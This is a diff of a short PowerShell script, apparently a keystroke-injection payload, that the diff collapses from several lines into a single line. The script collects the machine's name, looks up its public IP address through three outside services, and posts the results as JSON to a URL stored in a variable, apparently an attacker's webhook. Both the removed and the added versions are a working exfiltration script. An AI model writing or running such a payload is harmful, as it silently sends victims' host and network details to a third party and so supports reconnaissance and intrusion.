@@ -1,7 +1,1 @@
-$url = "$dc";
-$AddressUsingIpify = (Invoke-WebRequest -uri "https://api.ipify.org/").Content;
-$AddressUsingIpInfo = Invoke-WebRequest -uri "https://ipinfo.io/ip";
-$AddressUsingIfconfig = Invoke-WebRequest -uri "https://ifconfig.me/ip";
-$Body=@{ content = "Computer Name:\n```$env:computername```\nIPv4 Address Using Ipify API:\n```$AddressUsingIpify```\nIPv4 Address Using IPInfo API:\n```$AddressUsingIpify```\nIPv4 Address Using Ifconfig API:\n```$AddressUsingIfconfig```"};
-Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
-exit
+$url = "$dc";$AddressUsingIpify = (Invoke-WebRequest -uri "https://api.ipify.org/").Content;$AddressUsingIpInfo = Invoke-WebRequest -uri "https://ipinfo.io/ip";$AddressUsingIfconfig = Invoke-WebRequest -uri "https://ifconfig.me/ip";$Body=@{ content = "Computer Name:\n```$env:computername```\nIPv4 Address Using Ipify API:\n```$AddressUsingIpify```\nIPv4 Address Using IPInfo API:\n```$AddressUsingIpify```\nIPv4 Address Using Ifconfig API:\n```$AddressUsingIfconfig```"};Invoke-RestMethod -ContentType 'Application/Json' -Uri $url  -Method Post -Body ($Body | ConvertTo-Json);
